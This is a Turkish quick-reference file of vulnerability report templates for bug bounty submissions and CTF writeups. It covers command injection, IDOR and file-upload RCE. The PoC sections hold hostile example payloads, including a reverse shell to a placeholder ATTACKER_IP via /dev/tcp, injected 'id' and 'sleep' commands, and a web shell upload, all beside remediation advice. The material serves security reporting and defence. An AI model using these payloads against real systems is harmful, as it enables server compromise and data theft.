# Rapor Şablonları — Hızlı Referans

Bu dosya `report-generator` SKILL.md'deki şablonlara ek olarak, farklı zafiyet tipleri için kopyala-yapıştır hazır şablonlar içerir.

## Şablon 1: Genel Zafiyet Raporu (HackerOne Formatı)

```markdown
## [Zafiyet Tipi] in [Component/Endpoint]

**Severity:** [Critical/High/Medium/Low]
**CVSS v3.1 Vector:** [AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]
**CVSS Score:** [X.X]
**CWE:** [CWE-XXX]

### Summary
[1-2 cümle: Zafiyetin ne olduğu ve nerede bulunduğu]

### Description
[Teknik detay: Zafiyetin kök nedeni, etkilenen bileşen, saldırı vektörü]

### Steps to Reproduce
1. [Kesin URL ve HTTP metodu]
2. [Gönderilecek payload/veri]
3. [Beklenen sonuç vs gözlenen sonuç]

### Proof of Concept
\`\`\`bash
# Exploit komutu
curl -X [METHOD] "https://target.com/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"param": "PAYLOAD"}'
\`\`\`

### Impact
- [Birincil etki]
- [İkincil etki]
- [İş etkisi]

### Affected Assets
- **URL:** https://target.com/vulnerable-endpoint
- **Parameter:** `param_name`
- **Method:** POST

### Remediation
1. [Birincil düzeltme]
2. [Derinlemesine savunma]
3. [Monitoring önerisi]

### References
- [CWE Link]
- [OWASP Link]
- [İlgili CVE]
```

---

## Şablon 2: CTF Writeup Formatı

```markdown
# [Challenge Adı] — [Kategori] ([Puan] pts)

**Platform:** [CTFd/HTB/THM]
**Difficulty:** [Easy/Medium/Hard]
**Solved:** [Evet/Hayır]
**Flag:** `FLAG{...}`

## Challenge Description
[Orijinal challenge açıklaması]

## Solution

### Adım 1: Analiz
[İlk gözlemler, dosya tipi, ilk ipuçları]

### Adım 2: Keşif
[Kullanılan araçlar ve çıktıları]

\`\`\`bash
# Kullanılan komut
komut_ciktisi
\`\`\`

### Adım 3: Exploitation
[Zafiyetin/puzzle'ın çözüm adımları]

### Adım 4: Flag
\`\`\`
FLAG{...}
\`\`\`

## Öğrenilen Dersler
- [Teknik 1]
- [Teknik 2]

## Kullanılan Araçlar
- [Araç 1]
- [Araç 2]
```

---

## Şablon 3: Command Injection Raporu

```markdown
## OS Command Injection in [Endpoint]

**Severity:** Critical (CVSS 9.8)
**CVSS:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-78

### Description
`[parameter]` parametresi, sunucu tarafında shell komutu olarak çalıştırılıyor.
Kullanıcı girdisi sanitize edilmeden `os.system()` / `subprocess` / `exec()` gibi
fonksiyonlara aktarılıyor.

### PoC
\`\`\`bash
# Basic injection
curl "https://target.com/api/ping?host=127.0.0.1;id"

# Reverse shell
curl "https://target.com/api/ping?host=;bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"

# Blind injection (time-based)
curl "https://target.com/api/ping?host=127.0.0.1;sleep+5"
\`\`\`

### Impact
- Full server compromise (Remote Code Execution)
- Data exfiltration
- Lateral movement
- Complete system takeover

### Remediation
1. **Asla** kullanıcı girdisini shell komutuna dahil etme
2. subprocess yerine dile özgü kütüphaneler kullan
3. Input whitelist validation (sadece IP regex'i kabul et)
4. En az yetki prensibi (least privilege)
5. Sandbox/container isolation
```

---

## Şablon 4: IDOR Raporu

```markdown
## IDOR in [Endpoint] — Access to Other Users' [Resource]

**Severity:** High (CVSS 6.5-8.1)
**CVSS:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:[L|H]/A:N
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

### Description
`[endpoint]` endpoint'inde object ID değiştirilerek diğer kullanıcıların
[resource_type] verilerine yetkisiz erişim sağlanabiliyor.

### PoC
\`\`\`bash
# Normal istek (kendi verimiz)
curl -H "Authorization: Bearer USER_A_TOKEN" "https://target.com/api/user/123/data"
# 200 OK — kendi verimiz

# IDOR (başka kullanıcının verisi)
curl -H "Authorization: Bearer USER_A_TOKEN" "https://target.com/api/user/124/data"
# 200 OK — User 124'ün verisi! (IDOR!)
\`\`\`

### Impact
- [Sayı] kullanıcının kişisel verileri sızdırılabilir
- Başka kullanıcılar adına işlem yapılabilir
- GDPR/KVKK ihlali

### Remediation
1. Her istekte server-side yetkilendirme kontrolü yap
2. Object ID yerine session-based veri erişimi kullan
3. UUID/GUID kullan (tahmin edilemez ID'ler)
4. Rate limiting ekle
5. Access log monitoring
```

---

## Şablon 5: File Upload RCE Raporu

```markdown
## Unrestricted File Upload Leading to RCE in [Upload Feature]

**Severity:** Critical (CVSS 9.8)
**CVSS:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

### Description
[Upload feature] dosya uzantısı/MIME type kontrolü yapmıyor. PHP/JSP/ASPX
web shell yüklenebiliyor ve sunucuda arbitrary code execution sağlanıyor.

### PoC
\`\`\`bash
# Web shell upload
curl -X POST "https://target.com/upload" \
  -F "file=@webshell.php;type=image/jpeg"

# Shell erişimi
curl "https://target.com/uploads/webshell.php?cmd=id"
\`\`\`

### Remediation
1. Dosya uzantısı whitelist'i (sadece .jpg, .png, .pdf vb.)
2. Magic byte doğrulaması
3. Yüklenen dosyaları web root dışında sakla
4. Dosya adını rastgele oluştur
5. Yükleme dizininde script execution'ı devre dışı bırak
6. Dosya boyutu limiti koy
7. Antivirüs taraması ekle
```
